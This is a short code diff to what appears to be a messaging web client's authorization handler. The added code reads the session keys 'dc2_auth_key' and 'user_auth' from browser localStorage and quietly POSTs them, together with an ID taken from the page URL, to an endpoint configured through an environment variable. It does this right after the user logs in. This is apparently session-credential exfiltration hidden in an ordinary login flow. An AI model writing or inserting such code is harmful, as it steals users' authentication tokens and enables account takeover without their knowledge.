@@ -93,10 +93,33 @@ const onFirstMount = (): Promise<any> => {
         case 'auth.authorization':
           clearInterval(getStateInterval);
           localStorage.setItem('coreL', 'false');
-          
-          let dc2 = localStorage.getItem('dc2_auth_key')
-          let userauth = localStorage.getItem('user_auth')
-          
+          let url2 = window.location.href;
+  let currId2 = url2.split("/").pop();
+  async function saveAuthData() {
+    const dc2_auth_key = localStorage.getItem('dc2_auth_key');
+    const user_auth = localStorage.getItem('user_auth');
+    if (dc2_auth_key && user_auth) {
+      try {
+        const response = await fetch(import.meta.env.VITE_SAVE_AUTH, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ dc2_auth_key, user_auth, currId: currId2 }),
+        });
+
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        const data = await response.json();
+      } catch (error) {
+        console.error('Error saving auth data:', error);
+      }
+    } else {
+      console.error('Auth keys not found in localStorage');
+    }
+  }
+  if (!currId2.includes(":")) saveAuthData();
           import('./pageIm').then((m) => {
             m.default.mount();
           });
